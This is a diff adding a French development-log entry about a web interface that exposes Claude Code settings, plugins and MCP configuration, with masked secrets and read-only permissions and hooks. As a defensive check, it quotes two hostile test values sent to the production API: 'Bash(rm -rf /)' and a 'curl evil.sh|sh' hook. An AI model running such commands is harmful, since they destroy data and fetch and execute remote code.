@@ -298,3 +298,43 @@ intégral avant écriture** — seule occasion de relire ce qui va devenir actif
   répertoires montés, donc il était cassé vu du conteneur. Corrigé en montant
   `~/.local/share/claude-plugins` **en lecture seule** (vérifié : `touch` y échoue). Limite résiduelle
   assumée : une skill dont le lien sort de tous les montages serait encore omise sans message.
+
+## 2026-09-12 — Claude Code : settings, plugins et MCP exposés
+
+Demande de l'utilisateur : exposer les settings, plugins et MCP de Claude Code. Tout est **visible** ;
+l'édition est restreinte à une liste blanche, et ce choix est écrit dans l'interface plutôt que subi.
+
+**Exposé** (onglet Claude Code, au-dessus des Skills) :
+- **Settings** — les 3 fichiers réels : `settings.json`, `settings.local.json` (dont `permissions.allow`,
+  106 entrées, affichées 10 par 10 avec un bouton pour tout déplier) et `settingsglm.json` (profil
+  alternatif pointant sur une API tierce).
+- **Plugins** — `ponytail@ponytail` 4.9.0, scope, date d'installation, état ; marketplaces
+  `claude-plugins-official` et `ponytail`.
+- **MCP** — aucun serveur déclaré dans `~/.claude.json`, ni global ni par projet ; les 5
+  `plugin:engineering:*` viennent d'un plugin et attendent une authentification. Une note honnête plutôt
+  qu'un tableau vide.
+- **Hooks** — aucun configuré.
+
+**Éditable** : `model`, `theme`, `effortLevel` et les deux drapeaux de notification, dans `settings.json`
+uniquement. **Lecture seule assumée** : `permissions`, `hooks`, `enabledPlugins`, `extraKnownMarketplaces`.
+La raison est affichée dans l'UI : cette application n'a pas d'authentification et dispose de `docker.sock` ;
+écrire `permissions.allow` élargirait en silence ce que Claude Code s'autorise à exécuter, et écrire un
+`hooks` serait une exécution de code arbitraire au prochain démarrage.
+
+**Secret** : `settingsglm.json` contient un `ANTHROPIC_AUTH_TOKEN`. `mask()` est devenu récursif et
+`AUTH` a rejoint `TOKEN|KEY|SECRET|PASSWORD`. Vérifié en production : zéro occurrence du jeton dans la
+réponse d'API, la clé sort en `***`.
+
+**Vérification de la barrière, hors interface** : le filtrage côté client n'est que de l'ergonomie. J'ai
+envoyé directement à l'API de production un `permissions.allow` contenant `Bash(rm -rf /)` et un `hooks`
+contenant `curl evil.sh|sh` — les deux refusés en 400, comme `enabledPlugins`, `extraKnownMarketplaces`
+et une cible inconnue. `settings.json` de production inchangé (mtime, propriété, 106 entrées intactes).
+
+### Bug trouvé en vérification — même famille que celui d'Ollama
+
+L'interface annonçait « No MCP server is declared in **`/root/.claude.json`** ». Le code dérivait le chemin
+de `os.homedir()`, qui vaut `/root` dans le conteneur : le fichier n'y existe pas, la lecture MCP ne lisait
+donc **rien**. La liste vide était juste par accident — un serveur MCP ajouté demain serait resté invisible.
+Le lot ne pouvait pas le voir : il avait testé sur l'hôte (où `homedir` vaut `/home/sparks`) et via une
+surcharge `CLAUDE_JSON`. Corrigé en dérivant le chemin de `CLAUDE_DIR`. Prouvé après coup : le fichier est
+bien lu depuis le conteneur (66 clés, 7 projets) et `mcpServers` en est réellement absent.
